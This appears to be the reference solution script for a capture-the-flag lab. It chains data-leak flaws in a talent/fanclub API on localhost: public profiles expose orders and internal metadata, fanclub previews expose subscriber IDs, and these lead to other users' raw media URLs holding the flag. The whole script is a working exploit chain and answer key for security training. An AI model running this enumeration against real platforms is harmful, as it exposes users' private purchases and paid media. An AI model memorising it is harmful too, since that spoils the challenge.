#!/usr/bin/env bash
# ============================================================
# TalentHubProfileLeak (labs29) - reference solution:
# public profile over-share -> fanclub preview leak -> raw media.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8109)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8109}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

flag="$(python3 - "$BASE" <<'PY'
import json
import re
import sys
import urllib.parse
import urllib.request

base = sys.argv[1].rstrip("/")


def request(method, path):
    url = path if path.startswith("http") else base + path
    req = urllib.request.Request(url, headers={"Accept": "*/*"}, method=method)
    with urllib.request.urlopen(req) as response:
        return response.headers.get("Content-Type", ""), response.read().decode()


def json_request(path):
    _, raw = request("GET", path)
    return json.loads(raw)


def flag_from_text(text):
    match = re.search(r"FLAG\{nusasec-[0-9a-f]{32}\}", text)
    return match.group(0) if match else None


talents = json_request("/api/talents")["data"]
seed = next((row for row in talents if row.get("fanClubId")), None)
if seed is None:
    raise RuntimeError("no public talent with fanclub id found")

profile = json_request("/api/user/show/" + urllib.parse.quote(seed["handle"]))["data"]
if not profile.get("orders"):
    raise RuntimeError("public profile did not leak embedded orders")
if not profile.get("internalPricing") or not profile.get("featureFlags"):
    raise RuntimeError("public profile did not leak internal metadata")

fanclub_id = profile["profile"]["fanClubId"]
preview = json_request("/api/fanclub/preview/" + urllib.parse.quote(fanclub_id))["data"]
user_ids = list(preview.get("subscriberUserIds", []))
for message in preview.get("paidMessages", []):
    author_id = message.get("authorUserId")
    if author_id and author_id not in user_ids:
        user_ids.append(author_id)

checked_media = set()
for user_id in user_ids:
    try:
        leaked_profile = json_request("/api/user/show/" + urllib.parse.quote(user_id))["data"]
    except urllib.error.HTTPError:
        continue

    for order in leaked_profile.get("orders", []):
        raw_url = order.get("nakedMediaUrl")
        if not raw_url or raw_url in checked_media:
            continue
        checked_media.add(raw_url)
        _, media_body = request("GET", raw_url)
        flag = flag_from_text(media_body)
        if flag:
            print(flag)
            raise SystemExit(0)

raise RuntimeError("flag not found in leaked raw media")
PY
)"

if ! grep -Eq "^$FLAG_RE$" <<<"${flag:-}"; then
  echo "[-] failed: exploit did not print a valid arena flag" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
